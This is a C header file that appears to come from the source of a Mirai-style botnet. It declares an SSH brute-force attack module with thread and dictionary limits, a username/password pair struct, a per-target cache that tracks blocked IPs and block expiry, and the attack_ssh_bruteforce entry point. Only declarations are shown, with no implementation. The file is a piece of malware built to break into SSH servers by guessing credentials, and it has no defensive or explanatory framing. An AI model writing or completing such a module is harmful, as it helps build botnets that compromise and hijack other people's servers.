#pragma once
#include <stdint.h>
#include "includes.h"
#include "attack.h"
#define SSH_BRUTE_MAX_THREADS     128
#define SSH_BRUTE_MAX_DICT_SIZE   10000
#define SSH_BRUTE_MAX_WORD_LEN    64
#define SSH_BRUTE_CACHE_SIZE      1000
struct ssh_cred_pair {
    const char *user;
    const char *pass;
};
struct ssh_ip_cache {
    ipv4_t ip;
    uint16_t port;
    int checked;
    int blocked;
    time_t block_until;
};
void attack_ssh_bruteforce(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts);
